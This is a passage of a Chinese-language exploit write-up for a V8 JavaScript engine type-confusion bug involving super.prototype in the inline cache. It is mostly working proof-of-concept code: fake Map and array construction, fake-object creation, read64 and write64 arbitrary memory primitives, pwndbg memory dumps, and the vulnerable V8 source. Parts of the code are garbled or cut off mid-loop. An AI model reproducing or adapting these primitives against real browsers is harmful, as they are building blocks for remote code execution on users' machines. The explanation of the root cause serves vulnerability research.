    fake_array_map_map = read32(fake_array_map-1);
    fake_array_ele = read32(fake_array_addr+8) + 8;
    fake_array[0] = u2d(fake_array_map, 0);
    fake_array[1] = u2d(0x41414141, 0x2);
    fake_array[2] = u2d(fake_array_map_map*0x100, fake_array_map_map/0x1000000);
    fake_array[3] = 0;
    fake_array[4] = u2d(fake_array_ele*0x100, fake_array_ele/0x1000000);
    class A extends Array {
        constructor() {
            super();
            this.x1 = 1;
            this.x2 = 2;
            this.x3 = 3;
            this.x4 = (fake_array_ele-1+0x10+2) / 2;
        }
        m() {
            return super.prototype;
        }
    }
    let receive3 = new A();
    function trigger3() {   
        function lookup_start_object(){};
        A.prototype.__proto__ = lookup_start_object;
        lookup_start_object.prototype;
        return receive3.m()
    }
    for (let i = 0; i function
prototype(lookup_start_object+0x1B)`，如果该地址的`map`为表示类型的对象，如下所以：
    0x257d08242281: [Map]
     - type: JS_FUNCTION_TYPE
     - instance size: 32
     - inobject properties: 0
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
改对象的特点为：
    pwndbg> x/2gx 0x257d08242281-1
    0x257d08242280: 0x1408080808042119 0x084017ff19c20423
    pwndbg> x/2gx 0x257d00000000+0xC0
    0x257d000000c0: 0x0000257d08042119 0x0000257d08042509
    pwndbg> job 0x257d08042119
    0x257d08042119: [Map] in ReadOnlySpace
     - type: MAP_TYPE
     - instance size: 40
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - non-extensible
     - back pointer: 0x257d080423b5 
     - prototype_validity cell: 0
     - instance descriptors (own) #0: 0x257d080421c1 
     - prototype: 0x257d08042235 
     - constructor: 0x257d08042235 
     - dependent code: 0x257d080421b9 
     - construction counter: 0
如果`lookup_start_object+0x1B`执行的地址的`map`值为`0x08242281`，则获取其`prototype(+0xF)`
在上述的PoC中：`fake_array[2] = u2d(fake_array_map_map*0x100,
fake_array_map_map/0x1000000);`就是在伪造MAP类型的map。
该地址加上`0xf`：`fake_array[4] = u2d(fake_array_ele*0x100,
fake_array_ele/0x1000000);`，指向了`fake_array`的开始：
    fake_array[0] = u2d(fake_array_map, 0);
    fake_array[1] = u2d(0x41414141, 0x2);
而最开始，就是我们伪造的浮点型数组。有了`fake_obj`之后我们就可以编写`read64`函数了：
    function read64(addr)
    {
        fake_array[1] = u2d(addr - 0x8 + 0x1, 0x2);
        return fake_object[0];
    }
## 编写write64函数
然后就是`write64`函数：
    function write64(addr, data)
    {
        fake_array[1] = u2d(addr - 0x8 + 0x1, 0x2);
        fake_object[0] = itof(data);
    }
## 其他
剩下的工作就是按照惯例，套模板，修改偏移了，这PoC目前我也没觉得哪里有需要优化的地方。
# 漏洞简述
上述伪造`fake_obj`的逻辑中，v8返回函数的`prototype`的逻辑如下：
    Node* CodeStubAssembler::LoadJSFunctionPrototype(Node* function,
                                                     Label* if_bailout) {
      CSA_ASSERT(this, TaggedIsNotSmi(function));
      CSA_ASSERT(this, IsJSFunction(function));
      CSA_ASSERT(this, IsClearWord32(LoadMapBitField(LoadMap(function)),
                                     1  判断是否为MAP对象
      var_result.Bind(LoadMapPrototype(proto_or_map)); -> 如果是，则返回其prototype，偏移为0xf
      Goto(&done);
      BIND(&done);
      return var_result.value();
    }
该漏洞的原理在Chrome的bug描述页面也有说明，就是`receiver`和`lookup_start_object`搞混了。
下例代码：
    class A extends Array {
        constructor() {
            super();
            this.x1 = 1;
            this.x2 = 2;
            this.x3 = 3;
            this.x4 = (fake_array_ele-1+0x10+2) / 2;
        }
        m() {
            return super.prototype;
        }
    }
    let receive3 = new A();
其中变量`receive3`就是`receiver`，而`lookup_start_object`为`A.prototype.__proto__`。
然后就是以下代码：
    Handle LoadIC::ComputeHandler(LookupIterator* lookup) {
      Handle receiver = lookup->GetReceiver();
      ReadOnlyRoots roots(isolate());
      // `in` cannot be called on strings, and will always return true for string
      // wrapper length and function prototypes. The latter two cases are given
      // LoadHandler::LoadNativeDataProperty below.
      if (!IsAnyHas() && !lookup->IsElement()) {
        if (receiver->IsString() && *lookup->name() == roots.length_string()) {
          TRACE_HANDLER_STATS(isolate(), LoadIC_StringLength);
          return BUILTIN_CODE(isolate(), LoadIC_StringLength);
        }
        if (receiver->IsStringWrapper() &&
            *lookup->name() == roots.length_string()) {
          TRACE_HANDLER_STATS(isolate(), LoadIC_StringWrapperLength);
          return BUILTIN_CODE(isolate(), LoadIC_StringWrapperLength);
        }
        // Use specialized code for getting prototype of functions.
        if (receiver->IsJSFunction() &&
            *lookup->name() == roots.prototype_string() &&
            !JSFunction::cast(*receiver).PrototypeRequiresRuntimeLookup()) {
          TRACE_HANDLER_STATS(isolate(), LoadIC_FunctionPrototypeStub);
          return BUILTIN_CODE(isolate(), LoadIC_FunctionPrototype);
        }
      }
      Handle map = lookup_start_object_map();
      Handle holder;
      bool holder_is_lookup_start_object;
      if (lookup->state() != LookupIterator::JSPROXY) {
        holder = lookup->GetHolder();
        holder_is_lookup_start_object =
            lookup->lookup_start_object().is_identical_to(holder);
      }
当获取函数的`prototype`属性或者字符串对象获取其`length`属性时（也就是`super.prototype(super.length)`），使用的是`receiver`而不是`A.prototype.__proto__`。
上述代码为ICs的优化代码，在没有进行inline cache的情况下，漏洞并不会发生。
# 参考
  1. 
* * *